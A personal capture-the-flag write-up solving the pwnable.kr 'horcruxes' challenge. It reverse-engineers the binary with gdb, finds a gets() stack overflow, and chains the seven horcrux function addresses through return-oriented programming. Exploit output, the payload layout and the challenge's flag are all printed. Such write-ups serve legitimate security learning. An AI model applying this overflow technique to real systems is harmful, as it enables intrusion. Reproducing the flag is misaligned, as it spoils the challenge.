### horcruxes
It says:
```
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and ROP it!
author: jiwon choi

ssh horcruxes@pwnable.kr -p2222 (pw:guest)
```

and from the shell:
```
horcruxes@ubuntu:~$ ls -l
total 20
-rwxr-xr-x 1 root root 12424 Aug  8 07:16 horcruxes
-rw-r--r-- 1 root root   131 Aug  8 07:16 readme
horcruxes@ubuntu:~$ cat readme
connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege.
rop it to read the flag.

horcruxes@ubuntu:~$ 
```
The term `rop` I think it's "return oriented programming"
No C file:(
looking at the assembly this is the flow in general:
```
main -> alarm@plt (calls alarm so that you can not run it forever)
main -> hint -> puts@plt
main -> init_ABCDEFG -> some things related to random numbers
main -> seccomp_init@plt
main -> seccomp_rule_add@plt
main -> seccomp_rule_add@plt
main -> seccomp_rule_add@plt
main -> seccomp_rule_add@plt
main -> seccomp_rule_add@plt
main -> seccomp_load@plt
main -> ropme -> calls the function A,B,C,D,E,F,G and do all kind of checks
```
#### hint func:
just prints:
"
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and destroy it!
"
and returns

 ####  init_ABCDEFG func:
 the `open` command in the beggining, opens `/dev/urandom`:
 ```
 (gdb) x/16cb 0x80a0577
0x80a0577:	47 '/'	100 'd'	101 'e'	118 'v'	47 '/'	117 'u'	114 'r'	97 'a'
0x80a057f:	110 'n'	100 'd'	111 'o'	109 'm'	0 '\000'	47 '/'	100 'd'	101 'e
 ``` 
 Not sure what exactly it does with all these random numbers, but it does not ask for any input from the user.

After main returns from `init_ABCDEFG`, it starts a seccomp initialization, probably similar to what it did in the 
`asm` challenge.
and then it calls `ropme`

#### ropme func:
It reads ueser's input in 3 different places, 
1. with scanf("%d") , this is where the choose a "menu".
If the user enters one of the random values assigend to one of the "horcruxes" then he gets to enter to the coresponding function. But the problem is that we want to neter all of them.
2. with getchar(), - right after the scanf there is a getchar which does not seem to be used.
3. After comparing the input of the `scanf` to each `horc` , there is the `gets` function where the user 
answers "How many EXP did you earned?" The user should enter the sum of the EXP in the horcruxes.

```
0809ff05 <G>:
 809ff05:       55                      push   %ebp
 809ff06:       89 e5                   mov    %esp,%ebp
 809ff08:       83 ec 08                sub    $0x8,%esp
 809ff0b:       a1 7c 20 0a 08          mov    0x80a207c,%eax
 809ff10:       83 ec 08                sub    $0x8,%esp
 809ff13:       50                      push   %eax
 809ff14:       68 e8 04 0a 08          push   $0x80a04e8
 809ff19:       e8 22 fd ff ff          call   809fc40 <printf@plt>
 809ff1e:       83 c4 10                add    $0x10,%esp
 809ff21:       90                      nop
 809ff22:       c9                      leave  
 809ff23:       c3                      ret   
```

regarding the code in `ropme`:

```
80a00df:	83 c4 10             	add    $0x10,%esp
 80a00e2:	83 ec 0c             	sub    $0xc,%esp
 80a00e5:	8d 45 8c             	lea    -0x74(%ebp),%eax
 80a00e8:	50                   	push   %eax
 80a00e9:	e8 62 fb ff ff       	call   809fc50 <gets@plt>
 80a00ee:	83 c4 10             	add    $0x10,%esp
 80a00f1:	83 ec 0c             	sub    $0xc,%esp
 80a00f4:	8d 45 8c             	lea    -0x74(%ebp),%eax
 80a00f7:	50                   	push   %eax
 80a00f8:	e8 23 fc ff ff       	call   809fd20 <atoi@plt>
 80a00fd:	83 c4 10             	add    $0x10,%esp
 80a0100:	89 c2                	mov    %eax,%edx
 80a0102:	a1 78 20 0a 08       	mov    0x80a2078,%eax
 80a0107:	39 c2                	cmp    %eax,%edx
```
I ran with `gdb` and exemained the number in 0x80a2078 `x/1wd 0x80a2078` and entered the value.
this does cause the code of the open-read-puts , but it fails with "Bad system call" probably because of the seccomp.

```
   0x0809ffa7 <+131>:	call   0x809fc60 <seccomp_rule_add@plt>//open
   0x0809ffbb <+151>:	call   0x809fc60 <seccomp_rule_add@plt>//read
   0x0809ffcf <+171>:	call   0x809fc60 <seccomp_rule_add@plt>//write
   0x0809ffe6 <+194>:	call   0x809fc60 <seccomp_rule_add@plt>//exit
```


After A LOT  of exepriments, I got somthing:

```
Starting program: /home/horcruxes/horcruxes 
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and destroy it!

Select Menu:
Breakpoint 2, 0x080a0026 in ropme ()
(gdb) x/1wd 0x80a2088
0x80a2088 <a>:	172969048
(gdb) c
Continuing.
172969048

Breakpoint 1, 0x080a0030 in ropme ()
(gdb) c
Continuing.
You found "Tom Riddle's Diary" (EXP +172969048)
[Inferior 1 (process 24978) exited normally]
(gdb) disas
No frame selected.
(gdb) 
```
The idea: when "choosing" menu X , the program compare X to the value in 0x80a2088, so I examine the value and enter it. When running again, I get:
`You found "Tom Riddle's Diary" (EXP +142588352)` so, it changes every call, probably due to the random initialization.

I since `scanf("%d")` and `getchar()` are fine ,the only way to explot is with the `gets`.
I though that right after returning from `gets` we should return to the horcruxes, but actually this is impossible,
since the $eip of the return address is pushed to the stack in a lower address then the address of the buffer.
so it's possible to overrite the $ebp wich contain the value of returning from `ropme`.
So accroding to some calculations we need to fill 120 bytes and then to fille with the adresses of the horcruxes.
It indeed worked!


```
horcruxes@ubuntu:/tmp/hordafna$ python hor.py 
[+] Opening connection to 0 on port 9032: Done
<pwnlib.tubes.remote.remote object at 0x7fd84e1a6cd0>
Voldemort concealed his splitted soul inside 7 horcruxes.

Find all horcruxes, and destroy it!



Select Menu:
How many EXP did you earned? : 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaK\xfe   j\xfe   \x89\xfe   \xa8\xfe   ��   ��  \x05\xff   ��   
You found "Tom Riddle's Diary" (EXP +1637502302)
You found "Marvolo Gaunt's Ring" (EXP +692583410)
You found "Helga Hufflepuff's Cup" (EXP +-1908498685)
You found "Salazar Slytherin's Locket" (EXP +126977693)
You found "Rowena Ravenclaw's Diadem" (EXP +882330451)
You found "Nagini the Snake" (EXP +-1578568545)
You found "Harry Potter" (EXP +-1169047827)

```
The problem that got me crazy  is that I couldnt jump back to `ropme`, I got a segmentation fault.
Also I could not debug it with GDB as it needs to be entered interactivly.

I then found out it is possible to enter binary data right from the keyboard!
It is configurable from a files called `~/.inputrc`, 
With my terminal `xfce4-terminal` on xubuntu , I was able to enter the values 
`\x09\x00\x0a\x08` by typing:
ctrl+v+i, ctrl+@, ctrl+v+j, ctrl+v+h.
This can be tested by running 
`$ cat - > test`
entering the values from the keyboard, then ctrl+c
and `$ xxd test` shows the hexas.
apparently the problem is that the address contain `\x0a` which is end-of-line which tell `gets` to stop getting
input from the user and also replace `\x0a` with `\x00` to indicate end of string.
So a solution I found somewhere tells to jump to the address in `main` that calls `ropme`.
One more thing I read is that python does not overflow when adding, so when it adds the experiences it should
mimc C's addition which does overflow. I didn't implemented it, luckily `C` it didn't overflow in my try: 

```
horcruxes@ubuntu:/tmp/hordafna$ python hor.py 
[+] Opening connection to 0 on port 9032: Done
<pwnlib.tubes.remote.remote object at 0x7fd84e1a6cd0>
Voldemort concealed his splitted soul inside 7 horcruxes.

Find all horcruxes, and destroy it!



Select Menu:
How many EXP did you earned? : 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaK\xfe   j\xfe   \x89\xfe   \xa8\xfe   ��   ��  \x05\xff   ��   
idx = 0
You found "Tom Riddle's Diary" (EXP +1637502302)

1637502302
idx = 1
You found "Marvolo Gaunt's Ring" (EXP +692583410)

692583410
idx = 2
You found "Helga Hufflepuff's Cup" (EXP +-1908498685)

-1908498685
idx = 3
You found "Salazar Slytherin's Locket" (EXP +126977693)

126977693
idx = 4
You found "Rowena Ravenclaw's Diadem" (EXP +882330451)

882330451
idx = 5
You found "Nagini the Snake" (EXP +-1578568545)

-1578568545
idx = 6
You found "Harry Potter" (EXP +-1169047827)

-1169047827
sum: -1316721201
[*] Switching to interactive mode
Select Menu:$ 1
How many EXP did you earned? : $ -1316721201
Magic_spell_1s_4vad4_K3daVr4!

[*] Got EOF while reading in interactive

```
One thing which is still a mistary to me is how it was able to open the  flag with the seccomp loaded.
https://cragy0516.github.io/blukat-horcruxes/
http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html
https://stackoverflow.com/a/15629298/1019140
